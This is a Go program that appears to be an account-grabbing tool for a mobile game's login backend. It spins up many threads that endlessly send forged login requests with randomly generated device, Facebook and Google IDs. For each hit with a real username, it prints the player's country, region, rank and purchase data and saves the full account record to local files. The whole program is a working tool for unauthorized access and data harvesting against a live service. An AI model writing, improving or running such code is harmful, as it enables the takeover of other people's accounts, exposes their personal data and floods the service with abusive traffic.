package main

import (
        "bytes"
        "crypto/rand"
        "encoding/json"
        "fmt"
        "github.com/google/uuid"
        "io/ioutil"
        "math"
        "math/big"
        "net/http"
        "os"
        "strconv"
        "strings"
)

func input(text string) string {
        fmt.Print(text)
        var first string
        fmt.Scanln(&first)
        return first
}

func fjson(str string) interface{} {
        var a interface{}
        json.Unmarshal([]byte(str), &a)
        return a
}

func generateRandomNumber(numberOfDigits int) int {
        maxLimit := int64(int(math.Pow10(numberOfDigits)) - 1)
        lowLimit := int(math.Pow10(numberOfDigits - 1))
        randomNumber, _ := rand.Int(rand.Reader, big.NewInt(maxLimit))
        randomNumberInt := int(randomNumber.Int64())
        if randomNumberInt <= lowLimit {
                randomNumberInt += lowLimit
        }
        if randomNumberInt > int(maxLimit) {
                randomNumberInt = int(maxLimit)
        }
        return randomNumberInt
}

func pr(text string) {
        if len(text) > 0 || text != "" {
                username := strings.Split(text, `"Username":`)[1]
                username = strings.Split(username, ",")[0]
                username = strings.Trim(username, "\"")
                if !strings.HasPrefix(username, "Player ") {
                        trophy := strings.Split(text, `"SkillRating":`)[1]
                        trophy = strings.Split(trophy, ",")[0]
                        crown := strings.Split(text, `"Crowns":`)[1]
                        crown = strings.Split(crown, ",")[0]
                        hasbp := strings.Split(text, `"HasBattlePass":`)[1]
                        hasbp = strings.Split(hasbp, ",")[0]
                        createdat := strings.Split(text, `"Created":`)[1]
                        createdat = strings.Split(createdat, ",")[0]
                        country := strings.Split(text, `"Country":`)[1]
                        country = strings.Split(country, ",")[0]
                        region := strings.Split(text, `"Region:"`)[1]
                        region = strings.Split(region, ",")[0]
                        jso, _ := json.MarshalIndent(fjson(text), "", "  ")
                        file, _ := os.Create("Result-Grabber-Go/" + username + ".json")
                        defer file.Close()
                        file.WriteString(string(jso))
                        fmt.Printf("Username: %s\nCountry: %s\nRegion: %s\nCreated At: %s\nCrown: %s\nTrophy: %s\nHas Battle Pass: %s\n" /*\n Skins Total: %d\n" /*Animations Total: %d\nEmotes Total: %d\nFootsteps Total: %d\n"*/, username, country, region, createdat, crown, trophy, hasbp /*, skintol /*, antol, stitol, footol*/)
                }
        }
}

func req(url string) {
        client := &http.Client{}
        var p, e, r int = generateRandomNumber(9), generateRandomNumber(15), generateRandomNumber(20)
        l, _ := uuid.NewRandom()
        js := map[string]interface{}{"Id": p, "DeviceId": l.String(), "Version": "0.37", "FacebookId": strconv.Itoa(e), "GoogleId": "g" + strconv.Itoa(r), "AdvertisingId": ""}
        jsonv, _ := json.Marshal(js)
        req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonv))
        req.Header.Set("Host", "kitkabackend.eastus.cloudapp.azure.com:5010")
        req.Header.Set("User-Agent", "")
        req.Header.Set("Connection", "")
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("use_response_compression", "true")
        res, err := client.Do(req)
        if err == nil {
                body, _ := ioutil.ReadAll(res.Body)
                if res.StatusCode == 200 {
                        pr(string(body))
                }
                defer res.Body.Close()
        }
}

func main() {
        thread := input("Threads: ")
        thrd, _ := strconv.Atoi(thread)
        url := "http://kitkabackend.eastus.cloudapp.azure.com:5010/user/login"
        fmt.Printf("========================\n")
        os.Mkdir("Result-Grabber-Go", os.ModePerm)
        for i := 0; i < thrd; i++ {
                go func() {
                        for {
                                req(url)
                        }
                }()
        }
        for {
                req(url)
        }
}
